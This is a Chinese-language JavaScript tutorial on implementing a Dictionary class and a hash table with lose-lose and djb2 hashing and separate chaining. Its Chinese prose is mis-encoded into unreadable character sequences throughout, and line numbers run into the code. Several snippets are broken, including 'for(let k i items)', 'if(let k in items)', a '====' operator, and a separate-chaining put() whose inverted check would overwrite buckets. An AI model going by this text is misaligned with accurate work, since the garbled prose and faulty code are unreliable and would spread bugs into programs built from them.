clearï¼ˆï¼‰ï¼šé”®è¿™ä¸ªå­—å…¸ä¸­çš„æ‰€æœ‰å…ƒç´ å…¨éƒ¨åˆ é™¤ sizeï¼ˆï¼‰ï¼šè¿”å›žå­—å…¸æ‰€åŒ…å«å…ƒç´ çš„æ•°é‡ã€‚ä¸Žæ•°ç»„çš„ length ç›¸ä¼¼ keysï¼ˆï¼‰ï¼šå°†å­—å…¸æ‰€åŒ…å«çš„æ‰€æœ‰é”®åä»¥æ•°ç»„å½¢å¼è¿”å›ž valuesï¼ˆï¼‰ï¼šå°†å­—å…¸æ‰€åŒ…å«çš„æ‰€æœ‰æ•°å€¼ä»¥æ•°ç»„å½¢å¼è¿”å›žã€‚ has å’Œ set æ–¹æ³•é¦–å…ˆè¦å®žçŽ° has è¿™ä¸ªæ–¹æ³•ï¼Œå› ä¸ºå®ƒä¼šè¢« set å’Œ remove å…¶ä»–æ–¹æ³•è°ƒç”¨ã€‚æˆ‘ä¹ˆå¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç å®žçŽ° 123this.has = function(key)&#123; return items.hasOwnProperty(key);&#125; è¿™ä¸ªæ–¹æ³• çš„å®žçŽ°å’Œæˆ‘ä»¬ä¹‹å‰åœ¨ Set ç±»ä¸­çš„å®žçŽ°æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬ä½¿ç”¨ JavaScript ä¸­çš„ in æ“ä½œç¬¦æ¥éªŒè¯ä¸€ä¸ª key æ˜¯å¦æ˜¯ items å¯¹è±¡çš„ä¸€ä¸ªå±žæ€§ã€‚ ç„¶åŽå°±æ˜¯ set æ–¹æ³•çš„å®žçŽ° 123this.set = function(key,value)&#123; items[key] = value;&#125; è¯¥æ–¹æ³•æŽ¥å—ä¸€ä¸ª key å’Œ ä¸€ä¸ª value ä½œä¸ºå‚æ•°ã€‚æˆ‘ä»¬ç›´æŽ¥å°† value è®¾ä¸º items å¯¹è±¡çš„ key å±žæ€§çš„å€¼ã€‚å®ƒå¯ä»¥ç”¨æ¥ç»™å­—å…¸æ·»åŠ ä¸€ä¸ªæ–°çš„å€¼ï¼Œæˆ–è€…ç”¨æ¥æ›´æ–°ä¸€ä¸ªå·²æœ‰çš„å€¼ã€‚ deleteæ–¹æ³•å®ƒå’Œ Set ç±»çš„ delete æ–¹æ³•å¾ˆç±»ä¼¼ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œæˆ‘ä»¬å°†å…ˆæœç´¢ key (è€Œä¸æ˜¯ value) 1234567this.delete = function(key)&#123; if(this.has(key))&#123; delete items[key]; return true; &#125; return false;&#125; æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ JavaScript ä¸­çš„ delete æ“ä½œç¬¦æ¥åˆ é™¤ items å¯¹è±¡ä¸­çš„ key å±žæ€§ã€‚ get å’Œ values æ–¹æ³•å¦‚æžœæˆ‘ä»¬æƒ³åœ¨å­—å…¸é‡ŒæŸ¥æ‰¾ä¸€ä¸ªç‰¹å®šçš„é¡¹ï¼Œå¹¶æ£€ç´¢å®ƒçš„å€¼ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³• 123this.get = function(key)&#123; return this.has(key) ? items[key] : undefined;&#125; get æ–¹æ³•ä¼šé¦–å…ˆé€šè¿‡has æ–¹æ³•éªŒè¯æ˜¯å¦æœ‰ key å€¼å­˜åœ¨ï¼Œå­˜åœ¨å°±è¿”å›žè¯¥å€¼ï¼Œæ²¡æœ‰å°±è¿”å›žä¸€ä¸ª undefined ã€‚ ä¸‹é¢æ˜¯ values æ–¹æ³•ï¼Œä»¥æ•°ç»„çš„å½¢å¼è¿”å›ž å­—å…¸ä¸­æ‰€æœ‰çš„ values çš„å€¼ã€‚ 123456789this.values = function()&#123; const values = []; for(let k i items)&#123; if(this.has(k))&#123; values.push(items[k]); &#125; &#125; return values;&#125; clearã€sizeã€keys å’Œ getItems æ–¹æ³•clear å’Œ size æ–¹æ³•å’Œ é›†åˆé‚£ç« çš„å®žçŽ°æ˜¯å®Œå…¨ä¸€æ¨¡ä¸€æ ·çš„ã€‚ 123456789101112this.clear = function()&#123; this.items = &#123;&#125;;&#125;this.size = function()&#123; let count = 0; if(let k in items)&#123; if(this.has(k))&#123; ++count; &#125; &#125; return count;&#125; keys æ–¹æ³•è¿”å›žæ‰€æœ‰ç”¨äºŽæ ‡è¯†å€¼çš„é”®åï¼Œå¯ä»¥ä½¿ç”¨ Object ç±»çš„ keys æ–¹æ³• 123this.keys = function()&#123; return Object.keys(items);&#125; æœ€åŽï¼ŒéªŒè¯ items å±žæ€§çš„è¾“å‡ºå€¼ï¼Œæˆ‘ä»¬åŠ å¤šä¸€ä¸ªè¿”å›ž items å˜é‡çš„æ–¹æ³•ï¼Œå«åš getItems 123this.getItem = function()&#123; return items;&#125; ä½¿ç”¨ Dictionary ç±»123456789101112131415161718const dictionary = new Dictionary();dictionary.set('mail','544289495@qq.com');dictionary.set('website','http://laibh.top');dictionary.set('name','lbh');dictionary.set('word','1414');console.log(dictionary.getItem()); // &#123;mail: "544289495@qq.com", website: "http://laibh.top", name: "lbh", word: "1414"&#125;console.log(dictionary.get('word')); // 1414console.log(dictionary.size()); // 4console.log(dictionary.keys()); // ["mail", "website", "name", "word"]console.log(dictionary.values()); // ["544289495@qq.com", "http://laibh.top", "lbh", "1414"]dictionary.delete('word');console.log(dictionary.getItem()); // &#123;mail: "544289495@qq.com", website: "http://laibh.top", name: "lbh"&#125;console.log(dictionary.get('word')); // undefined console.log(dictionary.size()); // 3console.log(dictionary.keys()); // ["mail", "website", "name"]console.log(dictionary.values()); // ["544289495@qq.com", "http://laibh.top", "lbh"] æ•£åˆ—è¡¨æœ¬èŠ‚ä¸­ï¼Œä½ å°†ä¼šå­¦åˆ° HashTable ç±»ï¼Œä¹Ÿå« HashMap ç±»ï¼Œå®ƒæ˜¯ Dictionary ç±»çš„ä¸€ç§æ•£åˆ—è¡¨å®žçŽ°æ–¹å¼ã€‚ æ•£åˆ—ç®—æ³•çš„ä½œç”¨æ˜¯å°½å¯èƒ½å¿«åœ°åœ¨æ•°æ®ç»“æž„ä¸­æ‰¾åˆ°ä¸€ä¸ªå€¼ã€‚ä¹‹å‰çš„ç« èŠ‚é‡Œé¢ä½ å·²ç»çŸ¥é“è¦åœ¨æ•°æ®ç»“æž„ä¸­èŽ·å¾—ä¸€ä¸ªå€¼ï¼ˆä½¿ç”¨ get æ–¹æ³•ï¼‰ï¼Œéœ€è¦éåŽ†æ•´ä¸ªæ•°æ®ç»“æž„æ¥æ‰¾åˆ°å®ƒã€‚å¦‚æžœä½¿ç”¨æ•£åˆ—å‡½æ•°ï¼Œå°±çŸ¥é“å€¼çš„å…·ä½“ä½ç½®ï¼Œå› æ­¤èƒ½å¤Ÿå¿«é€Ÿæ£€ç´¢åˆ°è¯¥å€¼ã€‚æ•£åˆ—å‡½æ•°çš„ä½œç”¨æ˜¯ç»™å®šä¸€ä¸ªé”®å€¼ï¼Œç„¶åŽè¿”å›žå€¼åœ¨è¡¨ä¸­çš„åœ°å€ã€‚ åˆ›å»ºæ•£åˆ—è¡¨æˆ‘ä»¬å°†ä½¿ç”¨æ•°ç»„æ¥è¡¨ç¤ºæˆ‘ä»¬çš„æ•°æ®ç»“æž„ï¼Œä¸Žä¹‹å‰ä¸€æ ·ï¼Œä»Žæ­å»ºç±»çš„éª¨æž¶å¼€å§‹ 123function HashTable()&#123; let table = [];&#125; ç„¶åŽï¼Œç»™ç±»åŠ ä¸€äº›æ–¹æ³•ã€‚æˆ‘ä»¬ç»™æ¯ä¸ªç±»å®žçŽ°ä¸‰ä¸ªåŸºæœ¬æ–¹æ³•. putï¼ˆkey,valueï¼‰ï¼šå‘æ•£åˆ—è¡¨ä¸­å¢žåŠ ä¸€ä¸ªæ–°çš„é¡¹ï¼ˆä¹Ÿèƒ½æ›´æ–°æ•£åˆ—è¡¨ï¼‰ removeï¼ˆkeyï¼‰ï¼šæ ¹æ®é”®å€¼ä»Žæ•£åˆ—è¡¨ä¸­ç§»é™¤å€¼ getï¼ˆkeyï¼‰ï¼šè¿”å›žæ ¹æ®é”®å€¼æ£€ç´¢åˆ°çš„ç‰¹å®šçš„å€¼ã€‚ åœ¨å®žçŽ°ä¸‰ä¸ªæ–¹æ³•ä¹‹å‰ï¼Œè¦å®žçŽ°çš„ç¬¬ä¸€ä¸ªæ–¹æ³•å°±æ˜¯æ•£åˆ—å‡½æ•°ï¼Œå®ƒæ˜¯ HashTable ç±»ä¸­çš„ä¸€ä¸ªç§æœ‰æ–¹æ³•ã€‚ 1234567var loseloseHashCode = function(key)&#123; var hash = 0; for(var i = 0; i &lt; key.length; i++)&#123; hash += key.charCodeAt(i); &#125; return hash % 37;&#125; ç»™å®šä¸€ä¸ª key å‚æ•°ï¼Œæˆ‘ä»¬å°±èƒ½æ ¹æ®ç»„æˆ key çš„æ¯ä¸ªå­—ç¬¦çš„ ASCIIç å€¼çš„å’Œçš„å¾—åˆ°ä¸€ä¸ªæ•°å­—ã€‚æ‰€ä»¥ï¼Œé¦–å…ˆéœ€è¦ä¸€ä¸ªå˜é‡æ¥å­˜å‚¨è¿™ä¸ªæ€»å’Œã€‚ç„¶åŽï¼ŒéåŽ† key å¹¶å°†ä»Ž ASCII è¡¨ä¸­æŸ¥åˆ°çš„æ¯ä¸ªå­—ç¬¦å¯¹åº”çš„ ASCII å€¼åŠ åˆ° hash å˜é‡ä¸­ï¼ˆå¯ä»¥ä½¿ç”¨String ç±»çš„ charCodeAtæ–¹æ³•ï¼‰ã€‚æœ€åŽï¼Œè¿”å›ž hash å€¼ã€‚ä¸ºäº†å¾—åˆ°è¾ƒå°çš„å€¼ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨ hash å€¼å’Œä¸€ä¸ªä»»æ„çš„æ•°åšé™¤æ³•çš„ä½™æ•°ã€‚ çŽ°åœ¨æœ‰äº†æ•£åˆ—å‡½æ•°ï¼ŒåŸºäºŽå¯ä»¥å®žçŽ° put æ–¹æ³• 12345this.put = function(key,value)&#123; var position = loseloseHashCode(key); console.log(position + '-' + key); table[position] = value;&#125; é¦–å…ˆï¼Œæ ¹æ®ç»™å®šçš„ key ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®æ‰€åˆ›å»ºçš„æ•£åˆ—å‡½æ•°è®¡ç®—å‡ºå®ƒåœ¨è¡¨ä¸­çš„ä½ç½®ã€‚ä¸ºäº†æ–¹ä¾¿å±•ç¤ºæ¶ˆæ¯ï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®—å‡ºçš„ä½ç½®è¾“å‡ºè‡³æŽ§åˆ¶å°ã€‚ç”±äºŽå®ƒä¸æ˜¯å¿…éœ€çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€‰æ‹©çœç•¥ã€‚ç„¶åŽè¦åšçš„å°±æ˜¯ï¼Œå°† value å‚æ•°æ·»åŠ åˆ° ç”¨æ•£åˆ—å‡½æ•°è®¡ç®—å‡ºçš„å¯¹åº”çš„ä½ç½®ä¸Šã€‚ ä»Ž HashTable å®žä¾‹ä¸­æŸ¥æ‰¾ä¸€ä¸ªå€¼ä¹Ÿå¾ˆç®€å•ã€‚ä¸ºæ­¤æˆ‘ä»¬ä¼šå®žçŽ°ä¸€ä¸ª get æ–¹æ³• 123this.get = function(key)&#123; return table[loseloseHashCode(key)];&#125; é¦–å…ˆæˆ‘ä»¬ä¼šä½¿ç”¨æ‰€åˆ›å»ºçš„æ•£åˆ—å‡½æ•°æ¥æ±‚å‡ºæ‰€å¯¹åº”çš„ä½ç½®ã€‚è¿™ä¸ªå‡½æ•°ä¼šè¿”å›žå€¼çš„ä½ç½®ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æ ¹æ®è¿™ä¸ªä½ç½®æ¥ä»Žæ•°ç»„ table ä¸­èŽ·å¾—è¿™ä¸ªå€¼ã€‚ å®žçŽ°çš„æœ€åŽä¸€ä¸ªæ–¹æ³•æ˜¯ remove æ–¹æ³• 123this.remove = function(key)&#123; table[loseloseHashCode(key)] = undefined;&#125; è¦ä»Ž HashTable å®žä¾‹ä¸­ç§»é™¤ä¸€ä¸ªå…ƒç´ ï¼Œåªéœ€è¦æ±‚å‡ºå…ƒç´ çš„ä½ç½®å¹¶èµ‹å€¼ä¸º undefinedã€‚ å¯¹äºŽ HashTable ç±»æ¥è¯´ï¼Œæˆ‘ä»¬ä¸éœ€è¦åƒé“¾è¡¨ä¸€æ ·ä»Ž table æ•°ç»„ä¸­å°†ä½ç½®ä¹Ÿç§»é™¤ã€‚ç”±äºŽå…ƒç´ åˆ†å¸ƒæ•´ä¸ªæ•°ç»„èŒƒå›´å†…ï¼Œä¸€äº›ä½ç½®ä¼šæ²¡æœ‰ä»»ä½•å…ƒç´ å æ®ï¼Œå¹¶é»˜è®¤ä¸º undefinedå€¼ã€‚æˆ‘ä»¬ä¹Ÿä¸èƒ½å°†ä½ç½®æœ¬èº«åˆšä»Žæ•°ç»„ä¸­ç§»é™¤ï¼ˆè¿™æ ·ä¼šæ”¹å˜å…ƒç´ çš„ä½ç½®ï¼‰ï¼Œå¦åˆ™ï¼Œå½“ä¸‹æ¬¡éœ€è¦èŽ·å¾—æˆ–è€…æ˜¯ç§»é™¤ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™ï¼Œè¿™ä¸ªå…ƒç´ ä¼šä¸åœ¨æˆ‘ä»¬ç”¨æ•£åˆ—å‡½æ•°æ±‚å‡ºçš„ä½ç½®ä¸Šã€‚ ä½¿ç”¨ HashTable ç±»æµ‹è¯• HashTable ç±» 12345678910111213141516const hashTable = new HashTable();hashTable.put('mail','544289495@qq.com'); // 12-mailhashTable.put('website','http://laibh.top'); // 15-websitehashTable.put('name','lbh'); // 10-namehashTable.put('word','1414'); // 0-wordconsole.log(hashTable.get('website')); // http://laibh.topconsole.log(hashTable.get('word')); // 1414hashTable.remove('word');console.log(hashTable.get('website')); // http://laibh.top console.log(hashTable.get('word')); // undefined æ•£åˆ—è¡¨å’Œæ•£åˆ—ç»“åˆæ•£åˆ—è¡¨å’Œæ•£åˆ—æ˜ å°„æ˜¯ä¸€æ ·çš„ï¼Œåœ¨ä¸€äº›ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œè¿˜æœ‰ä¸€ç§å«åšæ•£åˆ—é›†åˆçš„å®žçŽ°ã€‚æ•£åˆ—é›†åˆç”±ä¸€ä¸ªé›†åˆæž„æˆï¼Œä½†æ˜¯æ’å…¥ã€ç§»é™¤æˆ–èŽ·å–å…ƒç´ æ—¶ï¼Œä½¿ç”¨çš„è¿˜æ˜¯æ•£åˆ—å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥é‡ç”¨æœ¬ç« ä¸­å®žçŽ°çš„æ‰€æœ‰ä»£ç æ¥å®žçŽ°æ•£åˆ—é›†åˆï¼Œä¸åŒä¹‹å¤„åœ¨äºŽï¼Œä¸å†æ·»åŠ é”®å€¼å¯¹ï¼Œè€Œæ˜¯åªæ’å…¥è€Œæ²¡æœ‰é”®ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨æ•£åˆ—é›†åˆæ¥å­˜å‚¨æ‰€æœ‰çš„è‹±æ–‡å•è¯ï¼ˆä¸åŒ…æ‹¬å®ƒçš„å®šä¹‰ï¼‰ã€‚å’Œé›†åˆç›¸ä¼¼ï¼Œæ•£åˆ—é›†åˆå€¼å­˜å‚¨å”¯ä¸€çš„ä¸é‡å¤çš„å€¼ã€‚ å¤„ç†åˆ—è¡¨ä¸­æ›´å¤šå†²çªæœ‰æ—¶å€™ï¼Œä¸€äº›è¡¨ä¼šæœ‰ç›¸åŒçš„æ•£åˆ—å€¼ã€‚ä¸åŒçš„å€¼åœ¨æ•£åˆ—è¡¨ä¸­å¯¹åº”ç›¸åŒçš„ä½ç½®çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç§°å…¶ä¸ºå†²çªã€‚ 123456789101112hashTable.put('Gandalf','Gandalf@qq.com'); hashTable.put('John','John@qq.com');hashTable.put('Tyrion','Tyrion@qq.com');hashTable.put('Aaron','Aaron@qq.com');hashTable.put('Donnie','Donnie@qq.com');hashTable.put('Ana','Ana@qq.com');hashTable.put('Jonathan','Jonathan@qq.com');hashTable.put('Jamie','Jamie@qq.com');hashTable.put('Sue','Sue@qq.com');hashTable.put('Mindy','Mindy@qq.com');hashTable.put('Paul','Paul@qq.com');hashTable.put('Nathan','Nathan@qq.com'); è¾“å‡ºç»“æžœå¦‚ä¸‹ 12345678910111219-Gandalf29-John16-Tyrion16-Aaron13-Donnie13-Ana5-Jonathan5-Jamie5-Sue32-Mindy32-Paul10-Nathan å¯ä»¥çœ‹å‡ºæ¥ï¼Œä¸Šé¢æœ‰å¾ˆå¤šç›¸åŒçš„æ•£åˆ—å€¼ã€‚ ä¸ºäº†èŽ·å¾—ç»“æžœï¼Œæˆ‘ä»¬æ¥å®žçŽ°ä¸€ä¸ªprint çš„è¾…åŠ©å‡½æ•°ã€‚ 1234567this.print = function()&#123; for(let i = 0; i &lt; table.length; ++i)&#123; if(table[i] !== undefined)&#123; console.log(i + ':' + table[i]); &#125; &#125;&#125; è¿è¡Œ print å‡½æ•°,å¾—åˆ°ä»¥ä¸‹è¾“å‡º 12345675:Sue@qq.com10:Nathan@qq.com13:Ana@qq.com16:Aaron@qq.com19:Gandalf@qq.com29:John@qq.com32:Paul@qq.com å¯ä»¥çœ‹å‡ºæ¥ï¼ŒæŒ‰ç…§å…ˆåŽçš„é¡ºåºï¼Œæœ‰ç›¸åŒ æ•£åˆ—å€¼çš„è¢«åŽé¢çš„è¦†ç›–äº†ã€‚ ä½¿ç”¨ä¸€ä¸ªæ•°æ®ç»“æž„æ¥ä¿å­˜æ•°æ®çš„ç›®çš„æ˜¾ç„¶ä¸æ˜¯åŽ»ä¸¢å¤±è¿™äº›æ•°æ®ï¼Œè€Œæ˜¯é€šè¿‡æŸä¸ªæ–¹æ³•å°†å®ƒä»¬å…¨éƒ¨ä¿å­˜èµ·æ¥ã€‚å› æ­¤ï¼Œå½“è¿™ç§æƒ…å†µå‘ç”Ÿçš„æ—¶å€™ï¼Œå¤„ç†å†²çªçš„æ–¹æ³•æœ‰å‡ ç§ï¼šåˆ†ç¦»é“¾æŽ¥ã€çº¿æ€§æŽ¢æŸ¥ã€åŒæ•£åˆ—æ³•ã€‚ è¿™é‡Œä»‹ç»ç¬¬ä¸€ç§æ–¹æ³• åˆ†ç¦»é“¾æŽ¥åˆ†ç¦»é“¾æŽ¥æ³•åŒ…æ‹¬ä¸ºæ•£åˆ—è¡¨çš„æ¯ä¸€ä¸ªä½ç½®åˆ›å»ºä¸€ä¸ªé“¾è¡¨å¹¶å°†å…ƒç´ å­˜å‚¨åœ¨é‡Œé¢ã€‚å®ƒæ˜¯è§£å†³å†²çªçš„æœ€ç®€å•çš„æ–¹æ³•ï¼Œä½†æ˜¯å®ƒåœ¨ HashTable å®žä¾‹ä¹‹å¤–è¿˜éœ€è¦é¢å¤–çš„å­˜å‚¨ç©ºé—´ã€‚ ä¾‹å¦‚ï¼šæˆ‘ä»¬åœ¨ä¹‹å‰çš„æµ‹è¯•ä»£ç ä¸­ä½¿ç”¨åˆ†ç¦»é“¾æŽ¥çš„è¯ï¼Œè¾“å‡ºç»“æžœä¼šæ˜¯è¿™æ ·çš„ï¼š åœ¨ä½ç½®5ä¸Šï¼Œå°†ä¼šæœ‰åŒ…å«3ä¸ªå…ƒç´ çš„ LinkedList å®žä¾‹;åœ¨ä½ç½®13ã€16ã€32ä¸Šï¼Œå°†ä¼šæœ‰åŒ…å«ä¸¤ä¸ªå…ƒç´ çš„ LinkedList å®žä¾‹;åœ¨ä½ç½®10ã€19å’Œ29ä¸Šï¼Œå°†ä¼šæœ‰åŒ…å«å•ä¸ªå…ƒç´ çš„ LinkedList å®žä¾‹ã€‚ å¯¹äºŽåˆ†ç¦»é“¾æŽ¥å’Œçº¿æ€§æŽ¢æŸ¥æ¥è¯´ï¼Œåªéœ€è¦é‡å†™ä¸‰ä¸ªæ–¹æ³•ï¼šputã€getå’Œremoveã€‚è¿™ä¸‰ä¸ªæ–¹æ³•åœ¨æ¯ç§æŠ€æœ¯å®žçŽ°ä¸­éƒ½æ˜¯ä¸åŒçš„ã€‚ ä¸ºäº†å®žçŽ°ä¸€ä¸ªä½¿ç”¨åˆ†ç¦»é“¾æŽ¥çš„ HashTable å®žä¾‹ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ–°çš„è¾…åŠ©ç±»æ¥è¡¨ç¤ºå°†è¦åŠ å…¥ LinkedList å®žä¾‹çš„å…ƒç´ ï¼Œæˆ‘ä»¬ç®¡å®ƒå« ValuePair ç±»ï¼ˆåœ¨ HashTable ç±»å†…éƒ¨å®šä¹‰ï¼‰ 1234567var ValuePair = function(key,value)&#123; this.key = key; this.value = value; this.toString = function()&#123; return '[' + this.key + '-' + this.value + ']'; &#125;&#125; è¿™ä¸ªç±»åªä¼šå°† key å’Œ value å­˜å‚¨åœ¨ä¸€ä¸ª Object å®žä¾‹æ±‡ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿé‡å†™äº† toString æ–¹æ³•ï¼Œä»¥ä¾¿äºŽæ‚æµè§ˆå™¨æŽ§åˆ¶å°è¾“å‡ºç»“æžœã€‚ put æ–¹æ³•123456789this.put = function(key,value)&#123; var position = loseloseHashCode(key); if(table[position] !== undefined)&#123; table[position] = new LinkedList(); &#125; table[position].append(new ValuePair(key,value));&#125; åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå°†éªŒè¯è¦åŠ å…¥æ–°å…ƒç´ çš„ä½ç½®æ˜¯å¦å·²ç»è¢«å æ®ï¼Œå¦‚æžœè¿™ä¸ªä½ç½®æ˜¯ç¬¬ä¸€æ¬¡è¢«åŠ å…¥å…ƒç´ ï¼Œæˆ‘ä»¬ä¼šåœ¨è¿™ä¸ªä½ç½®ä¸Šåˆå§‹åŒ–ä¸€ä¸ª LinkedList ç±»çš„å®žä¾‹ã€‚ç„¶åŽä½¿ç”¨ LinkedListé‡Œé¢çš„append æ–¹æ³•æ¥å‘LinkedList å®žä¾‹æ·»åŠ ä¸€ä¸ª ValuePair å®žä¾‹ï¼ˆé”®å’Œå€¼ï¼‰ get æ–¹æ³•12345678910111213141516171819this.get = function(key)&#123; var position = loseloseHashCode(key); if(table[position] !== undefined)&#123; // éåŽ†é“¾è¡¨æ¥å¯»æ‰¾é”®/å€¼ var current = table[position].getHead(); while(current.next)&#123; if(current.element.key === key)&#123; return current.element.value; &#125; current = current.next; &#125; // æ£€æŸ¥å…ƒç´ åœ¨é“¾è¡¨çš„ç¬¬ä¸€ä¸ªæˆ–è€…æ˜¯æœ€åŽä¸€ä¸ª if(current.element.key ==== key)&#123; return current.element.value; &#125; &#125; return undefined;&#125; é¦–å…ˆè¦åˆ¤æ–­åœ¨ç‰¹å®šä½ç½®ä¸Šé¢æ˜¯å¦æœ‰å…ƒç´ å­˜åœ¨ï¼Œæ²¡æœ‰åˆ™è¿”å›žä¸€ä¸ª undefined ã€‚åä¹‹åˆ™éåŽ†é“¾è¡¨æ¥å¯»æ‰¾æˆ‘ä»¬éœ€è¦çš„å…ƒç´ ï¼Œå…ˆèŽ·å–é“¾è¡¨è¡¨å¤´çš„å¼•ç”¨ï¼Œç„¶åŽå°±å¯ä»¥ä»Žé“¾è¡¨çš„å¤´éƒ¨éåŽ†åˆ°å°¾éƒ¨ Node é“¾è¡¨åŒ…å« next å’Œ element å±žæ€§ã€‚è€Œ element å±žæ€§åˆæ˜¯ ValuePair çš„å®žä¾‹ï¼Œæ‰€ä»¥å®ƒåˆæœ‰ value å’Œ key å±žæ€§ã€‚å¯ä»¥é€šè¿‡ current.element.key æ¥èŽ·å¾— Nodeé“¾è¡¨çš„ key å±žæ€§ï¼Œå¹¶é€šè¿‡æ¯”è¾ƒå®ƒæ¥ç¡®å®šå®ƒæ˜¯å¦å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„é”®ã€‚key ç›¸åŒå°±è¿”å›ž Node å€¼ï¼Œä¸ç›¸åŒï¼Œå°±ç»§ç»­éåŽ†ã€‚ å¦‚æžœè¦æ‰¾çš„å…ƒç´ æ˜¯é“¾è¡¨çš„ç¬¬ä¸€ä¸ªæˆ–è€…æ˜¯æœ€åŽä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°±ä¸ä¼šè¿›å…¥ while å¾ªçŽ¯ï¼Œå› æ­¤éœ€è¦åœ¨åŽé¢åŠ å¤šä¸€ä¸ªåˆ¤æ–­ã€‚ remove æ–¹æ³•1234567891011121314151617181920212223242526this.remove = function(key)&#123; var position = loseloseHashCode(key); if(table[position] !== undefined)&#123; var current = table[position].getHead(); while(current.next)&#123; if(current.element.key === key)&#123; table[position].remove(current.element); if(table[position].isEmpty())&#123; table[position] = undefined &#125; return true; &#125; current = current.next; &#125; // æ£€æŸ¥æ˜¯å¦ä¸ºç¬¬ä¸€ä¸ªæˆ–è€…æ˜¯æœ€åŽä¸€ä¸ªå…ƒç´  if(current.element.key === key)&#123; table[position].remove(current.element); if(table[position].isEmpty())&#123; table[position] = undefined &#125; return true; &#125; &#125; return false;&#125; åœ¨ removeæ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨å’Œget æ–¹æ³•ä¸€æ ·çš„æ­¥éª¤æ‰¾åˆ°è¦æ‰¾çš„å…ƒç´ ã€‚éåŽ† LinkedList å®žä¾‹ï¼Œå¦‚æžœé“¾è¡¨ä¸­çš„ current å…ƒç´ å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„å…ƒç´ ï¼Œä½¿ç”¨ remove æ–¹æ³•å°†å…¶ä»Žé“¾è¡¨ä¸­ç§»é™¤ï¼Œç„¶åŽè¿›ä¸€æ­¥é¢å¤–çš„éªŒè¯ï¼Œå¦‚æžœé“¾è¡¨ä¸ºç©ºï¼Œå°±å°†æ•£åˆ—è¡¨è¿™ä¸ªä½ç½®è®¾ä¸º undefined ,è¿™æ ·æœç´¢ä¸€ä¸ªå…ƒç´ æˆ–æ‰“å°å®ƒçš„å†…å®¹çš„æ—¶å€™ï¼Œå°±å¯ä»¥è·³è¿‡è¿™ä¸ªä½ç½®ã€‚æœ€åŽè¿”å›ž true è¡¨ç¤ºæ•´ä¸ªå…ƒç´ å·²ç»è¢«ç§»é™¤æˆ–è€…åœ¨æœ€åŽè¿”å›ž false è¡¨ç¤ºæ•´ä¸ªå…ƒç´ åœ¨æ•£åˆ—è¡¨ä¸­ä¸å­˜åœ¨ã€‚åŒæ ·ï¼Œå’Œ get æ–¹æ³•ä¸€æ ·ï¼Œå¤„ç†å…ƒç´ åœ¨ç¬¬ä¸€ä¸ªæˆ–è€…æœ€åŽä¸€ä¸ªçš„æƒ…å†µã€‚ é‡å†™äº†è¿™ä¸‰ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å°±æ‹¥æœ‰äº†ä¸€ä¸ªåˆ†ç¦»é“¾æŽ¥æ³•æ¥å¤„ç†å†²çªçš„HashMap å®žä¾‹äº†ã€‚ é‡æ–°è¿è¡Œä¹‹å‰çš„ä¾‹å­ï¼Œä¼šå¾—åˆ°ä»¥ä¸‹ç»“æžœ 12345675:[Jonathan-Jonathan@qq.com]-[Jamie-Jamie@qq.com]-[Sue-Sue@qq.com]10:[Nathan-Nathan@qq.com]13:[Donnie-Donnie@qq.com]-[Ana-Ana@qq.com]16:[Tyrion-Tyrion@qq.com]-[Aaron-Aaron@qq.com]19:[Gandalf-Gandalf@qq.com]29:[John-John@qq.com]32:[Mindy-Mindy@qq.com]-[Paul-Paul@qq.com] åˆ›å»ºæ›´å¥½çš„æ•£åˆ—å‡½æ•°æˆ‘ä»¬å®žçŽ°çš„ lose loseæ•£åˆ—å‡½æ•°å¹¶ä¸æ˜¯ä¸€ä¸ªè¡¨çŽ°è‰¯å¥½çš„æ•£åˆ—å‡½æ•°ã€‚å› ä¸ºå®ƒä¼šäº§ç”Ÿå¤ªå¤šçš„å†²çªã€‚ä¸€ä¸ªè¡¨çŽ°è‰¯å¥½çš„æ•£åˆ—å‡½æ•°æ˜¯ç”±å‡ ä¸ªæ–¹é¢æž„æˆçš„ï¼šæ’å…¥å’Œæ£€ç´¢å…ƒç´ çš„æ—¶é—´ï¼ˆå³æ€§èƒ½ï¼‰ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬è¾ƒä½Žçš„å†²çªå¯èƒ½æ€§ã€‚ å¦ä¸€ä¸ªå¯ä»¥å®žçŽ°çš„æ¯” lose lose æ›´å¥½çš„æ•£åˆ—å‡½æ•°æ˜¯ djb2 1234567var djb2HashCode = function(key)&#123; var hash = 5381; for(var i = 0; i &lt; key.length; i++)&#123; hash = hash* 33 + key.charCodeAt(i); &#125; return hash % 1013;&#125; å®ƒåŒ…æ‹¬åˆå§‹åŒ–ä¸€ä¸ª hash å˜é‡å¹¶èµ‹å€¼ä¸€ä¸ªè´¨æ•°ï¼Œç„¶åŽè¿­ä»£å‚æ•° key ï¼Œå°† hash ä¸Žå‚æ•°33ç›¸ä¹˜ ï¼Œå¹¶å’Œå½“å‰è¿­ä»£åˆ°çš„å­—ç¬¦çš„ ASCIIç å€¼ç›¸åŠ ã€‚ æœ€åŽï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ç›¸åŠ çš„å’ŒäºŽå¦ä¸€ä¸ªéšæœºè´¨æ•°ç›¸é™¤çš„ä½™æ•°ã€‚ 